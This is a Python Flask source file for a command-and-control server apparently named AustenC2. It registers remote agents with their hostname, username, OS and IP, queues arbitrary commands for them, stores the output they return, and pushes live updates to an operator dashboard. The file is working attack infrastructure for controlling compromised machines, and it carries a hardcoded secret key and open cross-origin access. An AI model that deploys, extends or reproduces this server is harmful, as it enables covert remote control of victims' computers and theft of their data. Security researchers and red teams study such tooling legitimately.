from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
from datetime import datetime
import sqlite3
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'austen'
socketio = SocketIO(app, cors_allowed_origins="*")

DB_FILE = 'c2.db'

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents(id TEXT PRIMARY KEY,hostname TEXT,username TEXT,os TEXT,ip TEXT,first_seen TEXT,last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks(id INTEGER PRIMARY KEY AUTOINCREMENT,agent_id TEXT,command TEXT,created TEXT,status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results(id INTEGER PRIMARY KEY AUTOINCREMENT,task_id INTEGER,agent_id TEXT,output TEXT,timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def log(message):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

@app.route('/')
def index():
    return jsonify({"status": "online", "message": "C2 Server Running"})

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    
    agent_id = str(uuid.uuid4())
    hostname = data.get('hostname', 'unknown')
    username = data.get('username', 'unknown')
    os_type = data.get('os', 'unknown')
    ip = request.remote_addr
    timestamp = datetime.now().isoformat()
    
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT INTO agents (id, hostname, username, os, ip, first_seen, last_seen)VALUES (?, ?, ?, ?, ?, ?, ?)''',(agent_id, hostname, username, os_type, ip, timestamp, timestamp))
    conn.commit()
    conn.close()
    log(f"New agent: {hostname} ({ip})")
    
    socketio.emit('new_agent', {
        'agent_id': agent_id,
        'hostname': hostname,
        'ip': ip
    })
    return jsonify({"status": "success", "agent_id": agent_id})

@app.route('/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    conn = get_db()
    c = conn.cursor()
    
    timestamp = datetime.now().isoformat()
    c.execute('UPDATE agents SET last_seen = ? WHERE id = ?', (timestamp, agent_id))
    c.execute('''SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending' ORDER BY created ASC''', (agent_id,))
    tasks = [{"id": row[0], "command": row[1]} for row in c.fetchall()]
    
    for task in tasks:
        c.execute('UPDATE tasks SET status = ? WHERE id = ?', ('sent', task['id']))
    
    conn.commit()
    conn.close()
    
    return jsonify({"tasks": tasks})

@app.route('/results', methods=['POST'])
def submit_results():
    data = request.get_json()
    
    agent_id = data.get('agent_id')
    task_id = data.get('task_id')
    output = data.get('output', '')
    timestamp = datetime.now().isoformat()
    
    conn = get_db()
    c = conn.cursor()
    
    c.execute('''INSERT INTO results (task_id, agent_id, output, timestamp) VALUES (?, ?, ?, ?)''', (task_id, agent_id, output, timestamp))
    c.execute('UPDATE tasks SET status = ? WHERE id = ?', ('completed', task_id))
    
    conn.commit()
    conn.close()
    
    log(f"Result received from {agent_id[:8]}...")
    socketio.emit('new_result', {
        'task_id': task_id,
        'agent_id': agent_id
    })
    
    return jsonify({"status": "success"})

@app.route('/api/agents', methods=['GET'])
def api_get_agents():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM agents ORDER BY last_seen DESC')
    
    agents = []
    for row in c.fetchall():
        # Calculate status
        last_seen = datetime.fromisoformat(row['last_seen'])
        now = datetime.now()
        delta = (now - last_seen).total_seconds()
        
        if delta < 30:
            status = 'online'
        elif delta < 300:
            status = 'idle'
        else:
            status = 'offline'
        
        agents.append({
            "id": row['id'],
            "hostname": row['hostname'],
            "username": row['username'],
            "os": row['os'],
            "ip": row['ip'],
            "first_seen": row['first_seen'],
            "last_seen": row['last_seen'],
            "status": status
        })
    
    conn.close()
    return jsonify({"agents": agents})

@app.route('/api/agents/<agent_id>', methods=['DELETE'])
def api_delete_agent(agent_id):
    conn = get_db()
    c = conn.cursor()
    
    c.execute('SELECT hostname FROM agents WHERE id = ?', (agent_id,))
    row = c.fetchone()
    
    if not row:
        conn.close()
        return jsonify({"error": "Agent not found"}), 404
    
    hostname = row['hostname']
    
    c.execute('DELETE FROM agents WHERE id = ?', (agent_id,))
    c.execute('DELETE FROM tasks WHERE agent_id = ?', (agent_id,))
    c.execute('DELETE FROM results WHERE agent_id = ?', (agent_id,))
    
    conn.commit()
    conn.close()
    
    log(f"Agent deleted: {hostname} ({agent_id[:8]}...)")
    socketio.emit('agent_deleted', {'agent_id': agent_id})
    return jsonify({"status": "success", "message": "Agent deleted"})

@app.route('/api/tasks', methods=['GET', 'POST'])
def api_tasks():
    conn = get_db()
    c = conn.cursor()
    
    if request.method == 'GET':
        c.execute('''SELECT t.*, a.hostname FROM tasks t LEFT JOIN agents a ON t.agent_id = a.id ORDER BY t.created DESC LIMIT 50''')
        
        tasks = [dict(row) for row in c.fetchall()]
        conn.close()
        return jsonify({"tasks": tasks})
    
    else:
        data = request.get_json()
        agent_id = data.get('agent_id')
        command = data.get('command')
        timestamp = datetime.now().isoformat()
        c.execute('''INSERT INTO tasks (agent_id, command, created, status) VALUES (?, ?, ?, 'pending')''', (agent_id, command, timestamp))
        
        task_id = c.lastrowid
        conn.commit()
        conn.close()
        
        log(f"Task created: {command}")
        
        socketio.emit('new_task', {
            'task_id': task_id,
            'agent_id': agent_id,
            'command': command
        })
        return jsonify({"status": "success", "task_id": task_id})

@app.route('/api/results', methods=['GET'])
def api_get_results():
    agent_id = request.args.get('agent_id')
    conn = get_db()
    c = conn.cursor()
    if agent_id:
        c.execute('''SELECT r.*, t.command FROM results r JOIN tasks t ON r.task_id = t.id WHERE r.agent_id = ? ORDER BY r.timestamp DESC LIMIT 20''', (agent_id,))
    else:
        c.execute('''SELECT r.*, t.command FROM results r JOIN tasks t ON r.task_id = t.id ORDER BY r.timestamp DESC LIMIT 50''')
    results = [dict(row) for row in c.fetchall()]
    conn.close()
    return jsonify({"results": results})

@socketio.on('connect')
def handle_connect():
    emit('status', {'message': 'Connected'})
if __name__ == '__main__':
    print("="*50)
    print("AustenC2 Server")
    print("http://0.0.0.0:5000")
    print("="*50)
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)